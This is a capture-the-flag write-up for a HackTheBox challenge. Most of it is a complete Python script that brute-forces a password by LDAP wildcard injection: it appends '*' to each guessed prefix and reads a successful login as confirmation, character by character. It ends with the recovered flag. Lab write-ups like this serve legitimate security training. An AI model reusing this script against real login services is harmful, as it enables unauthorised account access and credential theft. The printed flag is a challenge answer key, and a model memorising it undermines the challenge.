# LDAP authentication exploit

CTF: https://app.hackthebox.com/challenges/phonebook

Bruteforcing password using LDAP wildcard injection.

## Exploit

```python
import requests
import string

url = 'http://167.71.139.192:30363/login'
data = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
data = data.replace('*', '') # Since * is a LDAP wildcard, remove it from char list
i = 0
username = 'Reese' # Displayed on page, so this might be the username
pwd = ''

while True:
    req = requests.post(url, data={'username': username, 'password': pwd + data[i] + '*'})

    if (req.status_code == 200 and 'message' not in req.url):
        pwd = pwd + data[i]
        print('Found:', pwd)
        i = 0
    
    i += 1
```

## Result
Found the password *HTB{d1rectory_h4xx0r_is_k00l}* (and also the flag to solve the CTF) for the user Reese.

![ldap_exploit](https://user-images.githubusercontent.com/61932664/167595128-63d92a50-d8c9-402c-bf5b-dd3a9a04ed1d.JPG)
